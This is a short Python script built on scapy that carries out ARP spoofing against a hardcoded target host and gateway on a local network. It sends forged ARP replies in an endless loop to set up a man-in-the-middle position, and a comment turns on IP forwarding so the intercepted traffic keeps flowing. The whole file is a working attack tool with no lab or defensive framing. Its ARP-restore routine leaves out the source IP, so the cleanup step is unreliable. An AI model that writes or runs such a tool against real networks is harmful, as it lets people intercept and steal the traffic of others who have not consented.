import sys
import time
import scapy.all as scapy
# sudo echo 1> /proc/sys/net/ipv4/ip_forward


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc  

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


packet_count = 0
target_ip = "192.168.43.203"
gateway_ip = "192.168.43.1"
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_count += 2
        print(f"\r[+]Packet sent:{packet_count}", end="")
        time.sleep(1)  
except KeyboardInterrupt:
    print("\n[-]Detecting CTRL+C...Resetting ARP Tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
